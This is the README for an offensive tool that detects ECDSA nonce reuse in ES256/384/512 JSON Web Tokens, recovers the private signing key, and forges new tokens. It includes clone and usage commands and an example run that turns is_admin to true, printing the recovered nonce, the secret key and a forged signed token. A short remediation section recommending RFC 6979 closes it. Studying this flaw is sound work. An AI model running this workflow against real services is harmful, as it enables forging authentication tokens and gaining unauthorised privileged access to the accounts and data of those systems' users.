# krkrash.py — JWT ECDSA Nonce-Reuse Exploit & Forgery Tool

An offensive security tool for detecting ECDSA nonce reuse across JSON Web Tokens (`ES256`, `ES384`, `ES512`), recovering the underlying private signing key, and forging arbitrary JWT payloads.

---

## Overview

In Elliptic Curve Digital Signature Algorithm (ECDSA) implementations, every signature requires a cryptographically secure, unique ephemeral random nonce (k). If an application signs two distinct JWTs using the same private key (d) and the same nonce (k), the signature components collide (r₁ = r₂), allowing an attacker to mathematically derive the private key.

**krkrash.py** automates the full exploitation lifecycle—from signature extraction and curve detection to private key recovery and interactive token minting.

### Features
* **Multi-Curve Support:** Detects and processes **P-256 (`ES256`)**, **P-384 (`ES384`)**, and **P-521 (`ES512`)**.
* **Interactive Header/Payload Editor:** Modify decoded JWT header/payload claims on the fly (e.g., role/privilege escalation or expiration bypass) and re-sign new valid tokens using the key and nonce stolen from two vulnerable JWT tokens.
* **Built-In Test & Validation Suite:** Includes a self-contained example that generates a vulnerable token pair, computes the nonce, and finally recovers the private key and uses it to forge a new basic token. Simply for proof of concept.
---

## Installation

```bash
git clone https://github.com/Codex-Major/krkrash
cd krkrash
python3 ./krkrash.py
```

---

## Usage

### 1. Detect nonce reuse from two captured JWTs
Pass two tokens suspected of sharing the same `r` component to recover the private key and launch the interactive payload editor:

```bash
python3 krkrash.py --detect --jwt1 <JWT_1> --jwt2 <JWT_2>
```

### 2. Run the built-in example
Generates two basic, vulnerable, tokens using the same nonce and key, recovers k and d, and forges a new token:

```bash
python3 krkrash.py --gen-ex
```

### Example workflow:
```bash
./krkrash.py --sign --alg ES256 --header '{"alg":"ES256"}' --payload '{"uuid":1, "username":"user01", "email":"user01@example.tld", "is_admin":True}' -j1 eyJhbGciOiJFUzI1NiJ9.IntcInV1aWRcIjoxLFwidXNlcm5hbWVcIjpcInVzZXIwMVwiLFwiZW1haWxcIjpcInVzZXIwMUBleGFtcGxlLnRsZFwiLFwiaXNfYWRtaW5cIjpGYWxzZX0i.6EBK2NojGJxlffsthiRbJ8b4wgVACi4Mgy2wUlAUw08Uo6GSX_N2orMtRNDb92t9MOAsgMDfYoB25Tfc2WAQAw -j2 eyJhbGciOiJFUzI1NiJ9.IntcInV1aWRcIjoyLFwidXNlcm5hbWVcIjpcInVzZXIwMlwiLFwiZW1haWxcIjpcInVzZXIwMkBleGFtcGxlLnRsZFwiLFwiaXNfYWRtaW5cIjpGYWxzZX0i.6EBK2NojGJxlffsthiRbJ8b4wgVACi4Mgy2wUlAUw0962i-MRztt09_FrSLW0zZX4WVz_LN5ce5XqhLoifiI5w

╔══════════════════════════════════════════════════════════════════════════╗
║          _   __     ______     _   __ ______  ___   _____ _   _          ║
║         | | / /     | ___ \   | | / / | ___ \/ _ \ /  ___| | | |         ║
║         | |/ /______| |_/ /   | |/ /  | |_/ / /_\ \\ `--.| |_| |         ║
║         |    \______|    /    |    \  |    /|  _  | `--. \  _  |         ║
║         | |\  \     | |\ \    | |\  \ | |\ \| | | |/\__/ / | | |         ║
║         \_| \_/     \_| \_|   \_| \_/ \_| \_\_| |_/\____/\_| |_/ v1.0    ║
╠══════════════════════════════════════════════════════════════════════════╣
║     y² = x³ + ax + b  //  r₁ = r₂  ⇒  k = (z₁ - z₂)(s₁ - s₂)⁻¹  ⇒  d     ║
║ Detects JWT nonce reuse, recovers the private key, and mints new tokens. ║
╚══════════════════════════════════════════════════════════════════════════╝

[*] RFC 6979 exists for a reason, folks.

═════════════ JWT1 ═════════════
alg: ES256
r: 0xe8404ad8da23189c657dfb2d86245b27c6f8c205400a2e0c832db0525014c34f
═════════════ JWT2 ═════════════
alg: ES256
r: 0xe8404ad8da23189c657dfb2d86245b27c6f8c205400a2e0c832db0525014c34f
================================
[VULNERABLE]: ECDSA nonce REUSE DETECTED! The "r" values match while "s" values differ.

══════ ES256 RECOVERY RESULTS ══════
Shared r: 0xe8404ad8da23189c657dfb2d86245b27c6f8c205400a2e0c832db0525014c34f
Recovered Nonce: 0x8f69ecd30d6cd2ed042f1ce39c9cd166533343aa3bc615b6d0098ad7e9fe9f8a
Recovered SecretKey: 0xa4062df2cd209c531ccd0b714e77c9f799089a240ec5d0a241afb225bea2ee12

═════ NEW JWT PAYLOAD DATA ═════
{'uuid': 1, 'username': 'user01', 'email': 'user01@example.tld', 'is_admin': True}

═══════ S!GNED ES256 JWT ═══════
eyJhbGciOiJFUzI1NiJ9.eyJ1dWlkIjoxLCJ1c2VybmFtZSI6InVzZXIwMSIsImVtYWlsIjoidXNlcjAxQGV4YW1wbGUudGxkIiwiaXNfYWRtaW4iOnRydWV9.6EBK2NojGJxlffsthiRbJ8b4wgVACi4Mgy2wUlAUw08fHIo3EYJ85vjRcyV9Qfp9jdPag0AUu0cHQVd5OeP1gA
================================

```
---

## Links For Learning:

    - https://ecdsa.com/learn/ecdsa-nonce-reuse
    - https://crypto.stackexchange.com/questions/71764/is-it-safe-to-reuse-a-ecdsa-nonce-for-two-signatures-if-the-public-keys-are-diff
    - https://www.vaadata.com/en/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/
---

## Remediation

To prevent ECDSA nonce-reuse vulnerabilities in production systems:
* **Use Deterministic Nonces:** Implement **RFC 6979**, which derives $k$ deterministically from the private key and message hash using HMAC-DRBG, eliminating reliance on runtime CSPRNG state.
* **Use Audited Libraries:** Rely on actively maintained cryptographic libraries (e.g., `cryptography`, OpenSSL, libsodium) rather than custom ECDSA signing routines.

* **Simply Put:** **Don't reuse nonces!**
---

